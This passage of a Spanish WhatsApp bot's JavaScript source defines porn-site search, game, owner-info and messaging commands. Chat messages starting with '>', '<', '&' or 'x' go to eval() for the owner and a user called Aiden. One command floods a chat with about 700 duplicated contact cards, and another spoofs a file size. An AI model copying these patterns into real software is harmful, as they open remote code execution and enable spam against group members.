             kev.sendMessage(from,par,text,{quoted:vin,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Enlace Erroneo')
             }
             break
    case 'texto':
    if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (args.length < 1) return reply('Y el texto?')
            atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(arg)}`)
            kev.sendMessage(from, atetepe, MessageType.sticker, {quoted: vin})
        break
/*case 'wattpad':
                    if (args.length == 0) return reply(`Para buscar una Historia en los servidores de *wattpad* usa: ${prefix + comm} "Nombre"`)
                    wattpad = fs.readFileSync('./media/wattpad.jpg')
                    get = await KevFetch(`https://h4ck3rs404-api.herokuapp.com/api/wattpad?q=${body.slice(8)}&apikey=404Api`)
                    get = get.result
                    ini_txt = '🧇 *「 Wattpad Busqueda 」 🧇*\n\n'
                    for (var x of get) {
                        ini_txt += ` *🧇 Título:*  ${x.title}\n\n`
                        ini_txt += ` *🧇 Visitas:*  ${x.reads}\n\n`
                        ini_txt += ` *🧇 Me Gustas:*  ${x.vote}\n\n`
                        ini_txt += ` *?? Enlace:*  ${x.url}\n\n`
                        ini_txt += `*================================*\n\n`
                    }
                    kev.sendMessage(from, wattpad, MessageType.image, {quoted: vin, caption: ini_txt, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                    break*/
      case 'xnxx':
      if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                  if (args.length == 0) return reply(`Para buscar videos en los servidores de *XNXX* usa: ${prefix + comm} "Nombre"`)
                    get = await KevFetch(`https://h4ck3rs404-api.herokuapp.com/api/xnxx-search?q=${arg}&apikey=404Api`)
                    get = get.result
                    xnxx = fs.readFileSync('./media/xnxx.png')
                    ini_txt = '🧇 *「 Xnxx Busqueda 」 🧇*\n\n'
                    for (var x of get) {
                        ini_txt += ` *🧇 Título:*  ${x.judul}\n\n`
                        ini_txt += ` *🧇 Visitas:*  ${x.viewers}\n\n`
                        ini_txt += ` *🧇 Descripción:*  ${x.info}\n\n`
                        ini_txt += ` *🧇 Enlace:*  ${x.url}\n`
                        ini_txt += `*================================*\n\n`
                    }
                    kev.sendMessage(from, xnxx, MessageType.image, {quoted: vin, caption: ini_txt, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                    break
case 'phub':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                    if (args.length == 0) return reply(`Para buscar videos en los servidores de *PornHub* usa: ${prefix + comm} "Nombre"`)
                    get = await KevFetch(`https://h4ck3rs404-api.herokuapp.com/api/phub-search?q=${arg}&apikey=404Api`)
                    get = get.result
                    phub = fs.readFileSync('./videos/phub.mp4')
                    ini_txt = '🧇 *「 PornHub Busqueda 」 🧇*\n\n'
                    for (var x of get) {
                        ini_txt += ` *🧇 Título:*  ${x.title}\n\n`
                        ini_txt += ` *🧇 Subido Por:*  ${x.author}\n\n`
                        ini_txt += ` *🧇 Visitas:*  ${x.views}\n\n`
                        ini_txt += ` *🧇 Subido Hace:*  ${x.publish.replace('months','Meses').replace('ago','Atrás').replace('years','Años').replace('year','Año')}\n\n`
                        ini_txt += ` *🧇 Enlace:*  ${x.url}\n`
                        ini_txt += `*================================*\n\n`
                    }
                    kev.sendMessage(from, phub, MessageType.video, {mimetype: 'video/gif',quoted: vin, caption: ini_txt, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
                    break
case 'chatear':
if (!yo && !isOwner)return 
var pc = (q)
var numero = pc.split("|")[0];
var org = pc.split("|")[1];
kev.sendMessage(numero+'@s.whatsapp.net', org, MessageType.text, fakevin)
kev.sendMessage(from, `*El Mensaje:* ${org} *Se envio a el número:* ${numero}`, MessageType.text, fakevin)
break 
case 'ownerinfo':
let nike = `꒷꒦꒷꒦꒷꒷꒦꒷꒦꒷꒷꒦꒷꒦꒷꒦꒷꒷꒦꒷꒦꒷꒷꒦꒷꒦꒷꒦꒷

───── ❝ 𝕾𝖔𝖇𝖗𝖊 𝕸𝖎 ❞ ─────

*Ꮸ⃝🍓 ∙ Nombre :* _Keͥ͢vͣıͫ͘͜𝜂_
*Ꮸ⃝🍓 ∙ Número :* _@${sendc.split("@s.whatsapp.net")[0]}_
*Ꮸ⃝🍓 ∙ Prefix :* _| + |_
*Ꮸ⃝🍓 ∙ Runtime :* _${runtttt}_

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
*Ꮸ⃝🍓 ∙ Instagram*
_https://www.instagram.com/07.5.01_

*Ꮸ⃝🍓 ∙ Github*
_https://github.com/ds6_

*Ꮸ⃝🍓 ∙ Email*
_kevschofield@gmail.com_

*Ꮸ⃝🍓 ∙ Rest Api*
_In development At the moment_

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
\`\`\`〘 *Ꮸ⃝🚨* ATENCIÓN 〙️\`\`\`

_Si usas WhatsApp Mod y no te salen los botones usa el comando: *${prefix}bayuda*_
*Enviaré un vídeo mostrando lo que tienes que hacer para corregir el error....*

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
\`\`\`Ꮸ⃝❝ Gracias Especiales A :\`\`\`

*Ꮸ⃝❝ Aiden ❞*
*Ꮸ⃝❝ Manurios ❞*
*Ꮸ⃝❝ Samu ❞*
*Ꮸ⃝❝ Felix ❞*
*Ꮸ⃝❝ Diosamuel ❞*
*Ꮸ⃝❝ MhankBarBar ❞*
*Ꮸ⃝❝ Nurutomo ❞*
*Ꮸ⃝❝ Desarrolladores De Apis & Módulos ❞*`
loc = {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "jpegThumbnail": fs.readFileSync('./media/123.jpg')
            }
            kev.sendMessage(from, 
            {"contentText": nike,
            "footerText": `由凱文創建`,
            "buttons": [
            {"buttonId": `${prefix}menu`,
            "buttonText": {"displayText": "MENU"
            },"type": "RESPONSE"}
            ], "headerType": 6,
            "locationMessage": loc,
            quoted: null
            }, MessageType.buttonsMessage, {sendEphemeral: true, contextInfo: { mentionedJid: [sendc]}})
break
case 'creador':
case 'dueño':
case 'fundador':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
mynu = `35058145555`.repeat(65)
			let iniown = []
			for (let rt of mynu) {
			const vname = kev.contacts[rt] != undefined ? kev.contacts[rt].vname || kev.contacts[rt].notify : undefined
			iniown.push({ "displayName": 'Kevin', "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:Kҽѵíղ 🧇\nitem1.TEL;waid=50768666666:+507 6866-6666\nitem1.X-ABLabel:Número De Mi Creador 🧇\nitem2.EMAIL;type=INTERNET:kevschofield@gmail.com\nitem2.X-ABLabel:Puedes Contactarme En Mi Correo Electrónico 🧇\nEND:VCARD` })}
			await kev.sendMessage(from, { "displayName": `${iniown.length} kontak`, "contacts": iniown }, 'contactsArrayMessage', {quoted: vin})
            let creabin = `Hola, no olvides seguirme en mi Instagram *@07.5.01*
Pulse aquí
https://instagram.com/07.5.01

O también puedes seguirme en Github *ds6*
Pulse aquí
https://github.com/ds6

¿Quiere ver más información sobre el propietario?
Toque aquí para enviar un mensaje al propietario @${sendc.split("@s.whatsapp.net")[0]}`
             loc = {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "jpegThumbnail": fs.readFileSync('./media/123.jpg')
            }
            kev.sendMessage(from, 
            {"contentText": creabin,
            "footerText": `由凱文創建`,
            "buttons": [
            {"buttonId": `${prefix}ownerinfo`,
            "buttonText": {"displayText": "INFORMACIÓN"
            },"type": "RESPONSE"}
            ], "headerType": 6,
            "locationMessage": loc,
            quoted: null
            }, MessageType.buttonsMessage, {contextInfo: { mentionedJid: [sendc]}})
break

case 'youfix':
if (!isGroup && !yo)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if (!q) return reply(`*Que deseas buscar?*`)
        reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
        var bv = await KevFetch(
          `http://brizas-api.herokuapp.com/sociais/ytplaymp3?apikey=brizaloka&query=${q}`
        );
        var tamnel = await getBuffer(bv.thumb)
        
buttons = [{
                    "buttonId": `${prefix}buffervideo ${bv.link_share}`,
                    "buttonText": { 
                        "displayText": "*🎥「 V̷I̷D̷E̷O̷ 」🎥* "
                    },
                    "type": "RESPONSE"},
                    { "buttonId": `${prefix}bufferaudio ${bv.link_share}`,
                    "buttonText": 
                    { "displayText": "*🎵「 A̷U̷D̷I̷O̷ 」🎵* "
                    }
                    ,"type": "RESPONSE"}
                ]
imageMessage = (await kev.prepareMessage(from, tamnel, 'imageMessage',{ quoted: vin})).message.imageMessage
imageMessage["fileLength"] = 9999999999
buttonsMessage = { contentText: `*🧇「 Y̷o̷u̷t̷u̷b̷e̷ F̷i̷x̷ 」🧇* \n\n*𝕷⃝🧇 ∙ Titulo:* _${bv.titulo}_\n\n*𝕷⃝🧇 ∙ Canal:* _${bv.canal.name}_\n\n*𝕷⃝🧇 ∙ Enlace De Canal:* _${bv.canal.link}_\n\n*𝕷⃝🧇 ∙ Duración:* _${bv.duration}_\n\n*𝕷⃝🧇 ∙ Vistas:* _${bv.views}_`,
footerText: `*_Que deseas descargar ¿VIDEO o AUDIO?_*`,
imageMessage,
buttons,headerType: 4}
prep = await kev.prepareMessageFromContent(from, { buttonsMessage }, {})
kev.relayWAMessage(prep)
break


// JUEGOS BY KEVIN
case 'tictactoe':
case 'ttt':
case 'xo':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*

*Actualmente hay un juego activo*\n\n*@${boardnow.X} VS @${boardnow.O}*

*Jugador ❌:* _@${boardnow.X}_

*Jugador ⭕:* _@${boardnow.O}_

*Tu turno:* _@${boardnow.turn == "X" ? boardnow.X : boardnow.O}_


${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


*«Todos los derechos reservados @kevin»*`;
kev.sendMessage(from, chatMove, MessageType.text, {
quoted: desafio,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(
`*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*\n\nEtiqueta a quien quieras que sea ser tu oponente!\n\nEjemplo : *${prefix}xo @usuario*`
);
     const boardnow = setGame(`${from}`);
     console.log(`NUEVA SECCION DE TTT ${boardnow.session}`);
     boardnow.status = false;
     boardnow.X = sender.replace("@s.whatsapp.net", "");
     boardnow.O = argss[1].replace("@", "");
     fs.writeFileSync(
           `./lib/tictactoe/db/${from}.json`,
           JSON.stringify(boardnow, null, 2)
);
const strChat = `*🎮J̸U̸E̸G̸O̸ T̸R̸E̸S̸ E̸N̸ R̸A̸Y̸A̸🕹️*

Hey ${argss[1]}, el usuario @${sender.replace("@s.whatsapp.net","")} Te ha desafiado a una partida de *Tres Es Raya*

Si quieres aceptar el desafio escribe la letra: *S*

Si no quieres aceptar el desafio escribe la letra: *N*`;
kev.sendMessage(from, strChat, MessageType.text, {
quoted: desafio,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break
case 'delttc':
case 'reiniciarxo':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
reply(`El juego ha sido reniciado...!`);
} else {
reply(`No hay nigún juego en curso.`);
}
break

case 'dado':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
dadu = dadus[Math.floor(Math.random() * dadus.length)]
dador = fs.readFileSync('./database/dados/'+dadu+'.webp')
kev.sendMessage(from, dador, sticker, {quoted: vin})
break

case 'cs':
case 'carasello':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
const cara = fs.readFileSync('./database/cara/cara.webp');
const coroa = fs.readFileSync('./database/cara/sello.webp');
cararo = ["cara", "sello"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
gg = fej
cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
kev.sendMessage(from, cararoa, MessageType.sticker, {quoted: vin})
reply(`Tu Sacaste: *${fej}*`)
break
//


default:
/*if (budy.startsWith("/")){
const de2 = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
const tipes2 = await kev.downloadAndSaveMediaMessage(de2)        
const bufer2 = fs.readFileSync(tipes2)
loc = {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "jpegThumbnail": bufer2
            }
            kev.sendMessage(from, 
            {"contentText": `TEST`,
            "footerText": `Created By Kevin`,
            "buttons": [
            {"buttonId": `${prefix}ONLY TEST`,
            "buttonText": {"displayText": "A TEST BRO"
            },"type": "RESPONSE"},
            {"buttonId": `${prefix}ONLY TEST 2`,
            "buttonText": {"displayText": "A TEST BRO 2"
            },"type": "RESPONSE"}
            ], "headerType": 6,
            "locationMessage": loc,
            quoted: null
            }, MessageType.buttonsMessage, {})
}*/
if (budy.startsWith("=>")){
if (!yo && !isOwner && !isAiden) return
meta = await kev.loadMessage(from, vin.message.extendedTextMessage.contextInfo.stanzaId)
			res = await kev.generateForwardMessageContent(meta) 
			res = await kev.prepareMessageFromContent(from, res, {quoted:vin, contextInfo:{mentionedJid:[]}}) 
			kev.relayWAMessage(res)
}
if (budy.startsWith("#")){
if (!yo && !isOwner && !isAiden) return
if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
reply(`El juego ha sido reniciado...!`);
} else {
reply(`No hay nigún juego en curso.`);
}
}
if (budy.startsWith('evadil')){
            if (!yo && !isOwner && !isAiden) return
            const util = require("util");
            konsol = budy.slice(1)
            Return = (sul) => {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined){
            bang = util.format(sul)
            }
            return reply(bang)
            }
            try {
            reply(`${util.format(eval(`;(async () => { let q = { message: { [m.quoted.mtype]: m.quoted } }
			if (/sticker/.test(m.quoted.mtype)) {
			let img = new webp.Image()
			await img.load(await m.quoted.download())
			reply(util.format(JSON.parse(img.exif.slice(22).toString())))
			} })()`))}`)
            } catch(e){
            reply(`${String(e)}`)
            }}
if (budy.startsWith('>')){
            if (!yo && !isOwner && !isAiden) return
            const util = require("util");
            konsol = budy.slice(1)
            Return = (sul) => {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined){
            bang = util.format(sul)
            }
            return reply(bang)
            }
            try {
            reply(`${util.format(eval(`;(async () => { ${konsol} })()`))}`)
            } catch(e){
            reply(`${String(e)}`)
            }}
if (budy.startsWith('<')){
if (!yo && !isOwner && !isAiden) return 
                console.log(color('[EVAL]'), color(moment(vin.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                try {
                                  var konsol = budy.slice(1)
        function sendResult(sul) {
    var sat = JSON.stringify(sul, null, 2)
    var bang = util.format(sat)
       return reply(bang)}
                    let evaled = await eval(budy.slice(2))
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    textImg(`${evaled}`)
                } catch (err) {
                    textImg(`${err}`)
                }
            }
if (budy.startsWith('&')){
if (!yo && !isOwner  && !isAiden) return
const util = require("util");
    var konsol = q
        function sendResult(sul) {
    var sat = JSON.stringify(sul, null, 2)
    var bang = util.format(sat)
       return reply(bang)}
    reply(util.format(eval(`;(async () => { ${konsol} })()`)))
}
if (budy.startsWith('x')){
if (!yo && !isOwner && !isAiden) return
try {
return kev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: vin})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
}
})
}
starts()



	
    
